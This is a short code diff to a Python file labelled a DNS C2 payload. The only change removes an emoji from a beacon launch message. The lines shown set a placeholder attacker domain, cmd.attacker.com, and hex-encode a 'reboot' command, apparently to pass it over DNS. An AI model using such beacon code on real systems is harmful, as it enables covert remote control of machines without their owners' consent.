@@ -1,7 +1,7 @@
 # DNS C2 Payload
 import socket
 
-print("🛰️ Launching DNS C2 beacon...")
+print(" Launching DNS C2 beacon...")
 domain = "cmd.attacker.com"
 command = "reboot"
 encoded = command.encode("utf-8").hex()
